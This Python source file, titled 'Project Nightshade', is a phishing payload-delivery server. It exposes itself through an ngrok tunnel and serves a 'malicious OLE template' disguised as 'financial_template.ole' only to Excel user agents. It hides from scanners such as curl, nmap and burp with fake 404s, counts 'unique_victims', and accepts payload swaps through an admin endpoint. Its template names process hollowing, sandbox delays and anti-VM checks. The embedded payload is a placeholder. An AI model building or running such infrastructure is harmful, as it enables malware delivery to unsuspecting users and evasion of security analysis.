#!/usr/bin/env python3
"""
Project Nightshade - Advanced Template Delivery Server with Ngrok
Author: ek0ms savi0r | OPSEC Grade: Midnight
Description:
    Flask server with ngrok tunneling for instant infrastructure.
"""
from flask import Flask, request, send_file, abort, jsonify, make_response
import logging
import datetime
import sqlite3
import random
import time
import threading
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64
import os
import json
import requests
import subprocess
import atexit

class StagingConfig:
    PORT = 8080
    HOST = '0.0.0.0'
    DATABASE = 'staging_logs.db'
    TEMPLATE_FILE = 'nightshade_template.ole'

    USE_NGROK = True
    NGROK_AUTH_TOKEN = ''  # Your ngrok auth token for reserved domains
    NGROK_REGION = 'us'   # us, eu, au, ap, sa, jp, in

    EXCEL_USER_AGENTS = [
        'Microsoft Office Excel 2016',
        'Microsoft Excel 2019',
        'Microsoft Excel 365',
        'Microsoft Office/16.0 (Windows NT 10.0; Microsoft Excel 16.0)',
        'Microsoft Office/15.0 (Windows NT 6.1; Microsoft Excel 15.0)'
    ]

    BLOCKED_AGENTS = [
        'curl', 'wget', 'python-requests', 'Go-http-client',
        'nmap', 'burp', 'zap', 'metasploit', 'sqlmap'
    ]
    
    ENCRYPTION_KEY = 'nightshade-midnight-love-2023'

app = Flask(__name__)
config = StagingConfig()
ngrok_url = None
ngrok_process = None

def init_ngrok():
    """Initialize ngrok tunnel"""
    global ngrok_url, ngrok_process
    
    if not config.USE_NGROK:
        return None
    
    try:
        subprocess.run(['pkill', 'ngrok'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        cmd = [
            'ngrok', 'http', str(config.PORT),
            '--region', config.NGROK_REGION,
            '--log', 'stdout'
        ]
        
        if config.NGROK_AUTH_TOKEN:
            cmd.extend(['--authtoken', config.NGROK_AUTH_TOKEN])

        ngrok_process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True
        )

        time.sleep(3)
        ngrok_url = get_ngrok_url()
        
        if ngrok_url:
            print(f"[+] Ngrok tunnel established: {ngrok_url}")
            return ngrok_url
        else:
            print("[-] Failed to establish ngrok tunnel")
            return None
            
    except Exception as e:
        print(f"[-] Ngrok error: {e}")
        return None

def get_ngrok_url():
    """Get the public ngrok URL"""
    try:
        response = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=5)
        tunnels = response.json()['tunnels']
        for tunnel in tunnels:
            if tunnel['proto'] == 'https':
                return tunnel['public_url']
        return None
    except:
        return None

def cleanup_ngrok():
    """Cleanup ngrok process on exit"""
    global ngrok_process
    if ngrok_process:
        ngrok_process.terminate()
        ngrok_process.wait()
    subprocess.run(['pkill', 'ngrok'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def init_database():
    """Initialize SQLite database for logging"""
    conn = sqlite3.connect(config.DATABASE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS requests
                 (id INTEGER PRIMARY KEY, timestamp TEXT, ip TEXT, 
                  user_agent TEXT, domain_used TEXT, status TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS blocks
                 (id INTEGER PRIMARY KEY, timestamp TEXT, ip TEXT, 
                  reason TEXT, user_agent TEXT)''')
    conn.commit()
    conn.close()

def log_request(ip, user_agent, domain_used, status="DELIVERED"):
    """Log successful template deliveries"""
    conn = sqlite3.connect(config.DATABASE)
    c = conn.cursor()
    timestamp = datetime.datetime.now().isoformat()
    c.execute("INSERT INTO requests (timestamp, ip, user_agent, domain_used, status) VALUES (?, ?, ?, ?, ?)",
              (timestamp, ip, user_agent, domain_used, status))
    conn.commit()
    conn.close()

def log_block(ip, reason, user_agent):
    """Log blocked requests for analysis"""
    conn = sqlite3.connect(config.DATABASE)
    c = conn.cursor()
    timestamp = datetime.datetime.now().isoformat()
    c.execute("INSERT INTO blocks (timestamp, ip, reason, user_agent) VALUES (?, ?, ?, ?)",
              (timestamp, ip, reason, user_agent))
    conn.commit()
    conn.close()

def is_excel_request(user_agent):
    """Check if request comes from genuine Excel"""
    if not user_agent:
        return False
    
    user_agent = user_agent.lower()

    for blocked in config.BLOCKED_AGENTS:
        if blocked.lower() in user_agent:
            return False

    for excel_agent in config.EXCEL_USER_AGENTS:
        if excel_agent.lower() in user_agent:
            return True
    
    return False

def generate_malicious_template(payload_content=None):
    """Generate or refresh the malicious OLE template"""
    if not payload_content:
        # Default payload - could be encrypted PowerShell stager
        payload_content = "<?xml version='1.0'?><payload>EXECUTE_PAYLOAD</payload>"

    cipher = AES.new(pad(config.ENCRYPTION_KEY.encode(), AES.block_size), AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(payload_content.encode(), AES.block_size))
    encrypted_payload = base64.b64encode(cipher.iv + ct_bytes).decode()
    
    # Use ngrok URL if available, otherwise localhost for testing
    template_url = ngrok_url if ngrok_url else f"http://127.0.0.1:{config.PORT}"
    
    template_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<Objects xmlns="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
    <Object ProgID="Excel.Macro.1" Version="1.0">
        <Payload>{encrypted_payload}</Payload>
        <ActivationCondition>TRUE</ActivationCondition>
        <RemoteTemplate>{template_url}/template.ole</RemoteTemplate>
        <ExecutionMethod>ProcessHollowing</ExecutionMethod>
        <OPSEC>
            <SleepOnSandbox>30000</SleepOnSandbox>
            <CheckVM>true</CheckVM>
            <AntiDebug>true</AntiDebug>
        </OPSEC>
    </Object>
</Objects>'''
    
    with open(config.TEMPLATE_FILE, 'w', encoding='utf-8') as f:
        f.write(template_content)
    
    return config.TEMPLATE_FILE

@app.route('/template.ole')
def serve_template():
    """Main endpoint for template delivery"""
    client_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', '')

    if not is_excel_request(user_agent):
        log_block(client_ip, "INVALID_USER_AGENT", user_agent)
        abort(404)  # Return 404 to avoid suspicion

    if request.headers.get('X-Requested-With') == 'XMLHttpRequest':
        log_block(client_ip, "AJAX_REQUEST", user_agent)
        abort(404)

    domain_used = ngrok_url if ngrok_url else request.host
    log_request(client_ip, user_agent, domain_used)
    
    try:
        return send_file(config.TEMPLATE_FILE, 
                        as_attachment=True,
                        download_name='financial_template.ole',
                        mimetype='application/octet-stream')
    except FileNotFoundError:
        generate_malicious_template()
        return send_file(config.TEMPLATE_FILE, 
                        as_attachment=True,
                        download_name='financial_template.ole',
                        mimetype='application/octet-stream')

@app.route('/admin/stats')
def admin_stats():
    """Admin endpoint to view statistics"""
    conn = sqlite3.connect(config.DATABASE)
    c = conn.cursor()
    
    c.execute("SELECT COUNT(*) FROM requests")
    total_deliveries = c.fetchone()[0]
    
    c.execute("SELECT COUNT(DISTINCT ip) FROM requests")
    unique_victims = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM blocks")
    total_blocks = c.fetchone()[0]
    
    c.execute("SELECT timestamp, ip, user_agent FROM requests ORDER BY id DESC LIMIT 10")
    recent_activity = c.fetchall()
    
    conn.close()
    
    stats = {
        'total_deliveries': total_deliveries,
        'unique_victims': unique_victims,
        'total_blocks': total_blocks,
        'recent_activity': recent_activity,
        'ngrok_url': ngrok_url,
        'server_time': datetime.datetime.now().isoformat()
    }
    
    return jsonify(stats)

@app.route('/admin/update_payload', methods=['POST'])
def update_payload():
    """Endpoint to dynamically update the payload"""
    new_payload = request.json.get('payload')
    if new_payload:
        generate_malicious_template(new_payload)
        return jsonify({'status': 'success', 'message': 'Payload updated'})
    return jsonify({'status': 'error', 'message': 'No payload provided'})

@app.errorhandler(404)
def not_found(error):
    """Custom 404 handler"""
    return make_response(jsonify({'error': 'Not found'}), 404)

def background_monitoring():
    """Background thread to monitor ngrok connection"""
    while True:
        time.sleep(30)
        if config.USE_NGROK and not get_ngrok_url():
            print("[!] Ngrok tunnel lost, attempting to reconnect...")
            init_ngrok()

if __name__ == '__main__':
    atexit.register(cleanup_ngrok)

    init_database()
    generate_malicious_template()

    if config.USE_NGROK:
        ngrok_url = init_ngrok()

    monitor_thread = threading.Thread(target=background_monitoring, daemon=True)
    monitor_thread.start()
    
    print('''
    ╔══════════════════════════════════════════════════════════╗
    ║               NIGHTSHADE STAGING SERVER                  ║
    ║                 Ngrok-Enabled Delivery                   ║
    ║                   by : ek0ms savi0r                      ║
    ╚══════════════════════════════════════════════════════════╝
    ''')
    
    print(f"[+] Server starting on {config.HOST}:{config.PORT}")
    if ngrok_url:
        print(f"[+] Ngrok tunnel active: {ngrok_url}")
        print(f"[+] Template URL: {ngrok_url}/template.ole")
    else:
        print(f"[+] Local template URL: http://127.0.0.1:{config.PORT}/template.ole")
    print("[+] Template filtering enabled - only serving to Excel User-Agents")
    print("[+] Database logging initialized")
    
    app.run(host=config.HOST, port=config.PORT, debug=False, use_reloader=False)
